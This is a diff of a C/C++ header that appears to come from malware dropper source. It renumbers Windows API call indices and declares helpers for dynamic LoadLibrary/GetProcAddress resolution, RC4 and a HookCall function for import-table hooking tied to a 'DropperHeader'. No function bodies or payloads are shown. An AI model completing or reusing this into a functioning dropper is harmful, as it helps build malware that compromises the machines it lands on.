@@ -96,17 +96,15 @@ enum {
 #define CALL_GETVERSIONEX				29
 #define CALL_GETMODULEHANDLE			30
 #define CALL_GETMODULEFILENAMEA			31
-#define CALL_GETFILEATTRIBUTESA			32
-
 // NTDLL.DLL
-#define CALL_RTLEXITUSERPROCESS			33
+#define CALL_RTLEXITUSERPROCESS			32
 // MSVCRT.dll
-#define CALL_SPRINTF					34
-#define CALL_EXIT						35
-#define CALL__EXIT						36
+#define CALL_SPRINTF					33
+#define CALL_EXIT						34
+#define CALL__EXIT						35
 
 // ADVAPI32.DLL
-#define CALL_GETCURRENTHWPROFILE		37
+#define CALL_GETCURRENTHWPROFILE		36
 
 #pragma endregion
 
@@ -332,7 +330,8 @@ __forceinline char* _STRRCHR_(char const *s, int c);
 __forceinline void _STRCAT_(char*_src1, char *_src2);
 __forceinline void _ZEROMEM_(char* mem, int size);
 __forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD length );
-
+__forceinline LOADLIBRARY resolveLoadLibrary();
+__forceinline GETPROCADDRESS resolveGetProcAddress();
 #pragma endregion
 
 // TODO change all _End function using macros
@@ -359,6 +358,9 @@ FUNCTION_END_DECL(arc4);
 
 DWORD HookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DropperHeader *header); 
 FUNCTION_END_DECL(HookCall);
+
+
+
 
 void generate_key(std::string& key, unsigned int length);
 
